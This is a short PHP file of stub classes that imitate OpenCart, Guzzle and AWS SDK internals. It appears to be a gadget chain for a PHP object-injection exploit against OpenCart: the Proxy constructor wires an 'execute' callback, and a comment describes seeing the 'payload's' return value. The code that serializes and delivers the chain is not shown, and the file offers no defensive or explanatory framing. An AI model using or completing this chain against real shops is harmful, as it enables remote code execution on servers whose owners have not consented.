<?php

namespace Opencart\System\Engine
{
    Class Proxy
    {
        protected $data = [];

        public function __construct($key, $function)
        {
            $this->data[$key] = $function;
            // It's not essential to define a callback for 'execute' but doing
            // so delays hitting errors for few more function calls. Using
            // print_r here may mean you see the return value of the payload.
            $this->data['execute'] = 'print_r';
        }
    }
}


namespace GuzzleHttp\Handler {
    class CurlFactory {
        private $handles = [];

        public function __construct($handle) {
            $this->handles = $handle;
        }
    }
}

namespace Aws {
    class ResultPaginator {
        private $client;
        private $config;
        private $operation;
        private $args = [];

        public function __construct($client, $operation) {
            $this->config['output_token'] = false;
            $this->client = $client;
            $this->operation = $operation;
         }
    }

}
